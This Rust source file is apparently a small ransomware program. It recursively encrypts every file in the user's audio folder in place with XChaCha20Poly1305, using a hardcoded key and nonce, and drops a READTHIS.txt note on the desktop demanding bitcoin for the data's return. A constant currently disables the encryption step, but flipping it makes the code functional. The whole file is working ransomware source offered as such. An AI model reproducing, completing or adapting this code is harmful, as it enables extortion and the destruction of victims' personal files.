use std::{vec, fs, path::Path};
use directories::UserDirs;
use chacha20poly1305::{
    aead::{Aead, NewAead},
    XChaCha20Poly1305,
};
use walkdir::WalkDir;


const KEY: [u8;32] = [166, 161, 180, 32, 79, 74, 8, 187, 116, 115, 209, 91, 222, 139, 129, 16, 144, 72, 114, 185, 61, 132, 42, 15, 80, 19, 74, 184, 68, 42, 25, 201];
const NONCE: [u8; 24] = [141, 158, 165, 81, 73, 187, 150, 190, 73, 13, 114, 240, 2, 7, 205, 57, 37, 115, 47, 162, 165, 78, 165, 152];
const ENCRYPTING: bool = false;

fn encrypt_file(
    filepath: &str,
    cipher: &XChaCha20Poly1305,
) {
    if let Ok(file_data) = fs::read(filepath){
        let encrypted_file = cipher.encrypt(&NONCE.into(), file_data.as_ref());
        if let Ok (file_content) = encrypted_file {
            fs::write(&filepath, file_content);
        }
    }
}

fn decrypt_file(
    filepath: &str,
    cipher: &XChaCha20Poly1305,
)  {

    if let Ok(file_data) = fs::read(filepath) {
        let decrypted_file = cipher.decrypt(&NONCE.into(), file_data.as_ref());
        if let Ok (file_content) = decrypted_file {
            fs::write(&filepath, file_content);
        }
    }
}

fn crypt_files (paths:Vec<&Path>) {
    let cipher = XChaCha20Poly1305::new(&KEY.into());
    for path in paths{
        let files = WalkDir::new(path)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| !e.file_type().is_dir()).map(|e| String::from(e.path().to_string_lossy()));
        for filepath in files{
            if ENCRYPTING {
                encrypt_file(&filepath, &cipher)
            } else {
                decrypt_file(&filepath, &cipher)
            }
            println!("{}",filepath);
        }
    }
}

fn main() {
    let message = "your files are gone, send btc to this address to have your data back (DELETING THIS FILE COULD VOID THE ONLY POSSIBILITY YOU HAVE OF GETTING YOUR DATA BACK)";
    let user_dirs = UserDirs::new().unwrap();
    let paths = vec![
        user_dirs.audio_dir().unwrap()
    ];
    let readme_path = user_dirs.desktop_dir().unwrap().join("READTHIS.txt");
    if ENCRYPTING {
        crypt_files(paths);
        if !readme_path.exists(){
            fs::write(readme_path, message);
        }
    }
}